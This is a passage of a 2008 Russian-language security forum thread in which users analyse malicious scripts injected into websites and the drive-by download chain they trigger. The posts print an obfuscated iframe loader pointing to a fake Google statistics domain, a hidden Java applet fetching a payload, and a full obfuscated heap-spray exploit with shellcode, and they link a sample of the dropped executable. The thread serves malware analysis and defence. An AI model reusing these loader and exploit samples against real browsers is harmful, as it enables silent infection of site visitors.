<div class=username><div><b><a name="14" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 19:32 <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#14" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#14');return false;">#14</a> </span><div align=left><br>
<b>ToBad</b><br>Кто то мог продать левые сайты (3 уровня) по дешевке.<br>У них же бизнес на всем! Кто то отчеканые списки продает, кто то трафик. Ну а кто то покупает трафик или списки чтобы потом приумножить это хозяйство с помощью приватного сплойта.<br>В общем деньги делаются на всем. Я конечно не исключаю факт взлома народа, но как то мне оно собо не вериться. Об этом уже в инет новостях растрезвонили бы.
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=181857&amp;user=2365&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=14" class="addthx" data-post="181857"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="15" onfocus="this.blur()" href="JavaScript:di('[b]ToBad[/b]','')">ToBad</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/702.gif" alt=""><br><span class=txtSm>Ранг: 450.3 (мудрец), 13thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.67'>Активность: 0.2<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=702">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 20:24 <br><script type="text/javascript">QU('ToBad','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ToBad" target="_blank">Личное сообщение</a> &middot;  <a href="#15" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#15');return false;">#15</a> </span><div align=left><br>
<b>[HEX]</b><br>Всё понял ! Спасибо за разъяснения и помощь !
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181863&amp;user=702&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=15" class="addthx" data-post="181863"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="16" onfocus="this.blur()" href="JavaScript:di('[b]Flint[/b]','')">Flint</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/2981.jpg" alt=""><br><span class=txtSm>Ранг: 238.8 (наставник), 67thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.67'>Активность: 0.2<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2981">Участник</a><br><font color=blue>CyberHunter</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 05 марта 2008 10:23 <br><script type="text/javascript">QU('Flint','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Flint" target="_blank">Личное сообщение</a> &middot;  <a href="#16" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#16');return false;">#16</a> </span><div align=left><br>
А что сделает этот код?<br>&lt;script language=javascript&gt;<br>document.write(unescape(&#039;%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67 %65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E% 20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%7 3%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B %20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E% 6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6 F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74 %28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31% 2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%7 3%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E&#039;));dF(&#039;%264 Djgsbnf%2631xjeui%264E2%2631ifjhiu%264E2%2631tuzmf%264E%2633cpsefs%264 B%26311qy%264C%2633%2631tsd%264E%2633iuuq%264B00xxx/hpphmf.tubujtujd/d o0joefy/qiq%264Gxnje%264E%3A7%2633%264F%264D0jgsbnf%264F1&#039;)<br>&lt;/script&gt;
<br><br><font size="1"><i>-----<br>Nulla aetas ad discendum sera</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=181919&amp;user=2981&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=16" class="addthx" data-post="181919"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="17" onfocus="this.blur()" href="JavaScript:di('[b]censor[/b]','')">censor</a></b><br></div>
<img src="img/s4.gif" alt=""><br><span class=txtSm>Ранг: 50.2 (постоянный)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.35'>Активность: 0.01<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=3991">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 05 марта 2008 11:10 <br><script type="text/javascript">QU('censor','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=censor" target="_blank">Личное сообщение</a> &middot;  <a href="#17" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#17');return false;">#17</a> </span><div align=left><br>
<b>Flint</b><br>втыкает<br>&lt;iframe width=1 height=1 style=&quot;border: 0px;&quot; src=&quot;hххp://www.google-statistic.cn/wmid=96&quot;&gt;&lt;/iframe&gt;
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181923&amp;user=3991&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=17" class="addthx" data-post="181923"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="18" onfocus="this.blur()" href="JavaScript:di('[b]ToBad[/b]','')">ToBad</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/702.gif" alt=""><br><span class=txtSm>Ранг: 450.3 (мудрец), 13thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.67'>Активность: 0.2<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=702">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 05 марта 2008 11:31 <br><script type="text/javascript">QU('ToBad','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ToBad" target="_blank">Личное сообщение</a> &middot;  <a href="#18" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#18');return false;">#18</a> </span><div align=left><br>
<b>Flint</b> в любом случае думаю нормальный код никто прятать с помощью unescape не будет. Нет есть конечно программы для защиты таким способом, но это явно не оно...
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181924&amp;user=702&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=18" class="addthx" data-post="181924"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="19" onfocus="this.blur()" href="JavaScript:di('[b]RUNaum[/b]','')">RUNaum</a></b><br></div>
<img src="img/s3.gif" alt=""><br><span class=txtSm>Ранг: 25.1 (посетитель)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 13.56'>Активность: 0.01<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=8541">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 05 марта 2008 11:56 &middot; Поправил: RUNaum <br><script type="text/javascript">QU('RUNaum','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=RUNaum" target="_blank">Личное сообщение</a> &middot;  <a href="#19" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#19');return false;">#19</a> </span><div align=left><br>
Malware/spyware.<br><br>&gt; Exploit loading SpySnipe spyware:<br>&gt; hxxp://www.google-statistic.cn/wmid=93<br><br>google-statistic.CN - не гугловский ресурс, фейк.<br><br>--<br><br>Относительно ТС.<br>Информация собрана по крупицам + проверена.<br><br>вирус работает только под IE. по user-agent проверяется какой браузер, срабатывает только под IE/клонами, если отлаживать под фоксом, придется менять user-agent в конфиге. <br><br>одназначно устанавливает куки дабы потом ему не напрягатся и каждый раз запрашивать данные с левого сервера, вот почему при повторных попытках запрос к серверу не происходит.<br><br>Далее, при первом запросе идет скрытая подгрузка с адреса<br>hxxp://XXX.YYY.2traff.cn/traff2.cn/<br>  XXX - localhost, как видно из скрипта<br>  YYY - рандом (hex)<br><br>По этому адрес возращается шапка с параметром<br>&quot;Location hxxp://updates.4traff.cn/updates/index.php&quot;<br><br>соответсвенно редирект. Напоминаю, что ответ на редирект будет происходить при условии, что сервер опознает браузер как IE. происходит редирект, и подгрузка со следующих адресов:<br><br>hxxp://updates.4traff.cn/updates/javac.php<br>hxxp://updates.4traff.cn/updates/com.php<br><br>по первому делается попытка внедрения опасного апплета на невидимую загрузку тела вируса, находящегося по адресу hxxp://updates.4traff.cn/updates/load.php<br><br>Код:<br>&lt;applet archive=&quot;java.php&quot; code=&quot;BaaaaBaa.class&quot; width=1  height=1&gt;&lt;param name=&quot;url&quot; value=&quot;http://updates.4traff.cn/updates/load.php&quot;&gt;&lt;/applet&gt;&lt;meta HTTP-EQUIV=&quot;REFRESH&quot; content=&quot;2; URL=com.php&quot;&gt;<br><br>По второму, на всякий случай, наверное, внедряется еще javascript код, наверное использующий какую-то другую уязвимость:<br><br>Код:<br>&lt;script&gt;<br>x=unescape(&quot;%wuz9z0U9U0q%tuq9w0z9U0U%zuU1w8w6UAq%wut6t4U5qBq%quq0q3U8t Bz%UuU4z0z8tBz%zuw8zBz3w0t%tuq1U8U4U0t%wut5U8q0U5U%quq0z0U0z1z%tuz3z3q 0t0t%Uuw8q9wDz2w%UuU8z9q1t0q%tuw0z4z5w0z%tuU5q0w8z9U%wuq8q9z0w8z%Uuw0z Cw5w0w%zutCU0U8t3w%wuU8q9z2t8z%zut8z9q0t0q%tuz0U4z4q0w%tuqCw0t8w3z%tuw 6z6U0U8U%Uuq7t8q3zDt%Uut7tCz0w5q%zut8wBzFU2w%UuU8q1qDz8q%zuz9U0UCt3U%w uw0q0t0w0U%UuU8w9U0U0w%wuU3z3U1q8w%zut8q3UDq2z%quq0z4zCq0U%tut1U0q8q9q %quqCt0w8q3U%UuU8w1z0q4w%zut8w0tCU3z%wuq0U0t0q0w%Uut8z9t0U0U%tuz3z3w1U 8t%tuU8w9UCq0t%zuq8q3q0w3q%tut0w4tCU3t%Uuw8z1z6U6q%Uuq8U8qFzBz%zut7zCU 1tEU%zuU8UBtFz4t%tuz8z1wDq3z%wuw7U0UEqBw%Uuw0U0t1zEz%tuU6U6t0z0w%tuq3w 3w8zBw%wuU8U9t6q6q%zut4z2U3w2z%zuwCq6U4t2q%tuU0q8z0z2w%Uut6t6z4z2q%zuq 3t2z8qBq%quq3w1z6z6t%wut4w2q3t2U%wuwCt6w4w2q%zuU1z4z0U2t%Uut6w6q4U2U%U uq3t2q8UBw%tuw3t1q6t6z%quU4t2U3q2q%quq6z6t4U2q%UuzCU3w8q1U%quU0w1q6t0t %Uuz1q3z8z9q%wuz5w3q8w9q%tuz8U9q0t4t%tuw8U9w1wAU%tut0z4t5wAz%wuz9U0U9w 0z%qut9U0z9w0q%tuU9w0U9t0q%Uut0qfteqbq%quz3q3z5Ubt%Uuw6q6Ucq9w%tuw8z0t bU9U%quz8t0w0t1U%tuUeqfq3q3z%tuUez2t4q3U%quqeqbUfUaz%zuwet8z0w5U%quzfq fzeqcU%wuzfqfUfUfU%quw8wbU7qfw%zutdtfU4qeU%tuzezfwezfw%quz6t4weqfq%wuU eU3Uaqfw%Uuq9tfU6w4t%qut4q2wfz3z%Uuw9zfU6w4w%quz6zewez7z%zuqeqfz0q3t%q uUewfqetbt%wuq6U4zeUfq%wuqbU9z0U3q%quz6w1q8z7U%quUeq1UaU1w%Uut0U7U0U3t %zuUeUfU1z1z%wuzetfqewfz%quwawaU6t6z%quwbU9tetbq%wut7t7q8w7q%zut6q5U1w 1z%tuw0z7qeq1w%zutetfq1wfU%Uuqezftetfq%UuqaUat6q6z%tutbU9wew7t%UuUcUat 8z7q%wuU1t0t5tfU%Uuq0w7t2wdz%zuteUfq0tdU%wuUewfUeUfU%Uuqawaq6q6q%quUbz 9zez3z%qut0q0w8U7t%Uuw0UfU2z1q%tut0w7t8Ufw%tuzeUfU3tbq%tuzewfUezfU%Uuw azaU6t6t%wuqbU9wfUfz%wuU2UeU8q7w%zuw0Uaq9q6U%zuw0z7U5t7t%wuzewfw2w9w%U uzetftezfw%wuUataz6U6w%quUatfUftbw%quqdq7z6Uft%quw9waq2Ucq%qut6U6q1w5U %quUfz7qataq%wutez8w0q6U%wuzewfqeqeq%Uuqbq1qeqfU%Uuq9waU6U6w%zuU6U4Uct bq%tuqetbtataw%zuqewet8U5q%quw6z4zbU6t%tuwfw7tbqaz%quq0w7tbU9w%tuteUfz 6t4U%quzetfUewfq%UuU8q7wbqfw%wutfz5tdt9w%wuU9zfzcz0U%wuz7w8w0z7q%Uuqet fUewft%Uut6q6qewfU%tutfz3zataq%quq2UaU6t4q%UuU2zfz6zcz%tut6z6zbqfz%tut cqfwawaw%tuz1w0t8z7t%Uuwewfqewft%zuUbwfteqfU%quzaqaU6z4w%qut8z5zfUbU%U uqbt6wewdU%Uuwbtaq6q4w%Uut0t7zft7z%qutetft8Uez%quwetftetfq%wuwatateqcU %Uuq2q8Ucwfz%Uuzbz3zetfq%wutcU1U9t1t%quz2q8U8UaU%zuzewbtaUfq%wut8tat9U 7q%wuqeqfteqfw%quq9taw1q0q%zuw6U4tcUfU%quUez3zaUat%Uuteqew8q5q%quz6w4q bU6w%tutfU7tbtat%quzatfw0q7q%quteqftewfq%tuU8t5tetft%UuUbU7weU8w%tuqaz azezct%tuqdqcUcwbt%tuzbqcq3t4q%Uuz1z0tbwcz%quUcqfw9UaU%quqbqcqbqfq%wuq azaU6t4t%quU8U5zfU3U%quUbz6zewaw%Uuwbzaw6z4U%tuU0U7qfq7q%qutetftcqcz%q uzeUftezfU%quzezfq8U5U%wuz9qaw1U0q%tuU6t4qcqfw%UuteU7taUaq%quzetdw8q5q %zuz6U4zbU6t%wutfU7Ubzaz%quwfqfz0U7q%quqezftewfw%tuq8t5wewfU%wuU6z4t1z 0w%UuzftfUaqaq%Uutetez8t5q%tuU6z4wbU6q%tuwfU7zbwaw%qutetfU0q7w%quwetfq ezft%wuqazeqeUft%quqbqdqbU4t%qut0zeUetcU%zut0Uetetcq%wut0weqeUcq%zuz0z ezetct%tuU0q3U6tcw%zuUbt5qewbz%quU6z4zbqcw%tuU0Udt3t5t%tuzbzdw1w8U%wuw 0Ufw1U0t%zuw6t4wbqaq%quw6q4w0z3t%quwet7w9z2q%zuzbq2w6q4z%zuwbw9tew3U%z uU9tcz6t4w%Uuw6q4tdq3U%zuUfU1t9zbq%tuwetct9z7q%tutbt9U1qcz%zuU9q9z6t4w %tuweqctcqft%wutdqcz1qct%tuqaz6z2w6w%wuw4q2qaUeq%Uuq2tczeUct%UuUdqczbw 9w%quUet0q1U9U%quzftfU5w1q%zuq1zdtdt5z%quteU7w9zbt%tuq2U1q2weq%tuzeUcU eq2t%Uuzatfz1qdU%wut1zeU0q4t%Uut1t1qdz4z%quU9taqbU1q%tuUbw5t0zaw%zuq0z 4t6t4z%UuzbU5U6z4U%quqewctczbw%UuU8t9t3t2q%Uuwew3z6w4w%quU6U4zaw4w%tut fU3qbU5t%tuz3q2zewcU%Uutetbw6q4z%qutezcq6w4q%zuwbq1w2tat%qut2UdqbU2q%U uqewfqet7z%wuU1wbq0t7w%qut1t0t1z1U%quUbtat1w0t%tuUaw3tbUdw%zuzat0waz2U %zuwetfUaU1z%zuw7w4U6q8U%zuw7q0q7t4z%Uuq2Ufw3Uat%tuw6q4t2wft%tuq7t6w6z 5q%zuU6t1U2UeU%wuq7q2z6q5q%tuU3w4t6UfU%UuU6w3w2qew%wuz2zfq6weq%zuU6U4U 6q1q%wuw6t1q7q0w%Uuz6zbq6q3t%tuz6zcz2tfz%zuw6w1t6Ufw%zuq2tet6t4z%zuw6U 8t7t0t%qut0z0t7t0q%tuU0t0z0z0q&quot;.replace(/[zwqUt]/g, &#039;&#039;));<br>tu=unescape(&quot;%1u10OdO01dO%XuO0od101d1&quot;.replace(/[1oXOW]/g, &#039;&#039;));<br>var memz=parseInt(&quot;0NxNdE0%dr0%dE0%dE&quot;.replace(/[E%rNF]/g, &#039;&#039;));<br>while(tu.length&lt;0x40000) tu+=tu; <br>tu=tu.substring(0,parseInt(&quot;0ux83Ifuf8eu4I&quot;.replace(/[Q6Iu8]/g, &#039;&#039;))-x.length);<br>o=new Array(); for(i=0;i&lt;450;i++) o[i]=tu+x;z=Math.ceil(memz);<br>var nbqnb =(&quot;C%LASVIeDA:eEeCs4e4V4sC%BA6e-A3sEs7VEs-A4%8%6e5A-VBA1%Ce3V-%0VD%EV7 %2sEeFV3A9sBs3AFV&quot;.replace(/[sVeA%]/g, &#039;&#039;));<br>document.write(&quot;&lt;%oRb%j%eRcztR %cwlza%s%sziwdz=w&quot;%n~bzq~n~bz&quot;z&gt;R&lt;%/~oRbwjze~c%tw&gt;w&quot;.replace(/[Rz%w~]/ g, &#039;&#039;));<br>eval(&quot;zj=jdjo%cUuymje%nMtj.ysycUrjiUpUtjsy[j0U]M.jc%rMe%a%tUeyCMo%nMtM rjo%l%RMajn%gje%(j)M.MlUe%nMgytjhU&quot;.replace(/[jU%yM]/g, &#039;&#039;));<br>&lt;/script&gt;
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181927&amp;user=8541&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=19" class="addthx" data-post="181927"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="20" onfocus="this.blur()" href="JavaScript:di('[b]ToBad[/b]','')">ToBad</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/702.gif" alt=""><br><span class=txtSm>Ранг: 450.3 (мудрец), 13thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.67'>Активность: 0.2<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=702">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 05 марта 2008 13:03 <br><script type="text/javascript">QU('ToBad','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ToBad" target="_blank">Личное сообщение</a> &middot;  <a href="#20" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#20');return false;">#20</a> </span><div align=left><br>
<b>RUNaum</b> Спасибо за детальное описание ! IE - зло. Если раньше только с порносайтов людям лезло всякое г. то теперь полно вполне приличных ресурсов которые распространяют гавнокод не подозревая об этом....
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181940&amp;user=702&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=20" class="addthx" data-post="181940"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="21" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 05 марта 2008 13:29 &middot; Поправил: [HEX] <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#21" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#21');return false;">#21</a> </span><div align=left><br>
<b>RUNaum</b><br>Тоже самое и я писал <img src="img/smilies/s1.gif" alt=""> Инфа раскидана по постам в этом топике.<br>Кроме 2traff.cn по той же методе работают hxxp://shivaom.net/classes/<br><br><b>ToBad</b><br>Подобная метода уже давно практикуется! Так что чтобы цепануть вирус не обязательно ходить по порно/кряко сайтам. Достаточно просто походить по инету с помощью IE (на мозилу с оперой как то меньше сплойтев).
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=181942&amp;user=2365&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=21" class="addthx" data-post="181942"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="22" onfocus="this.blur()" href="JavaScript:di('[b]ToBad[/b]','')">ToBad</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/702.gif" alt=""><br><span class=txtSm>Ранг: 450.3 (мудрец), 13thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.67'>Активность: 0.2<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=702">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 05 марта 2008 17:00 <br><script type="text/javascript">QU('ToBad','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ToBad" target="_blank">Личное сообщение</a> &middot;  <a href="#22" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#22');return false;">#22</a> </span><div align=left><br>
Хотя для меня вопрос и исчерпан, я не буду закрывать топик, ибо его можно использовать как ответвление от топика &quot;Прислали трояна..успешно&quot;, что в принципе уже и делается...
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181961&amp;user=702&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=22" class="addthx" data-post="181961"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="23" onfocus="this.blur()" href="JavaScript:di('[b]scripter[/b]','')">scripter</a></b><br></div>
<img src="img/s1.gif" alt=""><br><span class=txtSm>Ранг: 2.0 (гость)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 12.31'>Активность: 0=0</span><br>Статус: <a href="action=userinfo&amp;user=15971">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 21 марта 2008 06:50 <br><script type="text/javascript">QU('scripter','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=scripter" target="_blank">Личное сообщение</a> &middot;  <a href="#23" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#23');return false;">#23</a> </span><div align=left><br>
Спасибо [HEX] за разбор скрипта.   Можешь сказать подробнее где в скрипте происходит привязка к его размеру.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=183781&amp;user=15971&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=23" class="addthx" data-post="183781"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="24" onfocus="this.blur()" href="JavaScript:di('[b]4t[/b]','')">4t</a></b><br></div>
<img src="img/s3.gif" alt=""><br><span class=txtSm>Ранг: 38.3 (посетитель)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 13.39'>Активность: 0.02<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=10070">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 21 марта 2008 21:28 <br><script type="text/javascript">QU('4t','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=4t" target="_blank">Личное сообщение</a> &middot;  <a href="#24" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#24');return false;">#24</a> </span><div align=left><br>
www.colorsky.ru<br>Подгрузился файлик file.exe, жесть, прям на рабочий стол )). Антивирь даже глазом не моргнул <img src="img/smilies/s10.gif" alt="">.<br> <br>файлик: rapidshare.com/files/101290991/file.7z<br>пасс: pass
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=183862&amp;user=10070&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=24" class="addthx" data-post="183862"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="25" onfocus="this.blur()" href="JavaScript:di('[b]UsAr[/b]','')">UsAr</a></b><br></div>
<img src="img/s4.gif" alt=""><br><span class=txtSm>Ранг: 66.8 (постоянный)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.14'>Активность: 0.03<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1854">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 21 марта 2008 22:13 <br><script type="text/javascript">QU('UsAr','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=UsAr" target="_blank">Личное сообщение</a> &middot;  <a href="#25" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#25');return false;">#25</a> </span><div align=left><br>
есть такая программка malzilla, написанная специально для раскриптовки таких скриптов<br>malzilla.sourceforge.net/tutorial01/index.html
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=183866&amp;user=1854&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=25" class="addthx" data-post="183866"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="26" onfocus="this.blur()" href="JavaScript:di('[b]arnix[/b]','')">arnix</a></b><br></div>
<img src="img/s6.gif" alt=""><br><span class=txtSm>Ранг: 210.5 (наставник), 2thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.96'>Активность: 0.14<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=26">Участник</a></span></div>
<br>
</td>
